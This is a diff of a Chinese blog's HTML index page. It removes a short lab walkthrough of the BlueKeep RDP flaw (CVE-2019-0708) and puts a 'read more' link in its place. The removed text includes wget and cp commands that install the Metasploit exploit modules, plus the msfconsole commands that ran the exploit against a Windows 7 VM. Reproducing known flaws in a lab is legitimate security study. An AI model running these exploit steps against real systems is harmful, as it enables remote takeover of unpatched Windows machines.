@@ -382,34 +382,15 @@
 
       
         
-          
-            <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">CVE-2019-0708</a>，此漏洞是预身份验证且无需用户交互（无需验证系统账户密码），这就意味着这个漏洞可以通过网络蠕虫的方式被利用</p>
+          <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">CVE-2019-0708</a>，此漏洞是预身份验证且无需用户交互（无需验证系统账户密码），这就意味着这个漏洞可以通过网络蠕虫的方式被利用</p>
 <p>今天早上一起来就看到朋友圈传开了MSF更新了CVE-2019-0708的rb,白天由于要上课只有晚上回来复现一下，最后发现没有想象中的那么好</p>
-<h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境Mac+VMware Fusion安装<a href="ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/" target="_blank" rel="noopener">Windows7 SP1作为靶机</a></p>
-<p><img src="/2019/09/07/CVE-2019-0708远程桌面代码执行漏洞复现/1.png" alt="1"></p>
-<p>这里注意要检查一下3389是否开启，默认的是关闭的，手动开启3389，然后确保攻击机跟靶机能正常通信</p>
-<p><img src="/2019/09/07/CVE-2019-0708远程桌面代码执行漏洞复现/2.png" alt="2"></p>
-<h4 id="攻击工具准备"><a href="#攻击工具准备" class="headerlink" title="攻击工具准备"></a>攻击工具准备</h4><p>由于这个exp代码是别人pull requests的，还并没有合并到主分支，自动更新是没有的，所以需要手动添加，exp的公布<a href="https://github.com/rapid7/metasploit-framework/pull/12283/files" target="_blank" rel="noopener">地址</a></p>
-<p>首先为了保证exp的有效性，先给msf做个更新msfupdate，然后去下载作者公布出来的四个文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure>
-
-<p>把下载下来的文件替换到相应的目录中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/</span><br><span class="line"></span><br><span class="line">cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</span><br></pre></td></tr></table></figure>
-
-<p>使用如下命令进入利用模块，并查看利用的相关信息,目前exp仅仅支持64位的win 7 sp 1，2008 R2，且有四个target选项</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">info</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/09/07/CVE-2019-0708远程桌面代码执行漏洞复现/3.png" alt="3"></p>
-<p>接下来直接输入,因为是装在vmware中的靶机所以target需要选择3，然后直接就拿到靶机😋</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.197.151</span><br><span class="line">set target 3 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/09/07/CVE-2019-0708远程桌面代码执行漏洞复现/4.png" alt="4"></p>
-<p>成功拿下O(∩_∩)O哈哈~</p>
-<p><img src="/2019/09/07/CVE-2019-0708远程桌面代码执行漏洞复现/5.png" alt="5"></p>
-<p><img src="/2019/09/07/CVE-2019-0708远程桌面代码执行漏洞复现/6.png" alt="6"></p>
-<p>结束，睡觉去（<del>🙂</del>）</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/09/07/CVE-2019-0708远程桌面代码执行漏洞复现/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
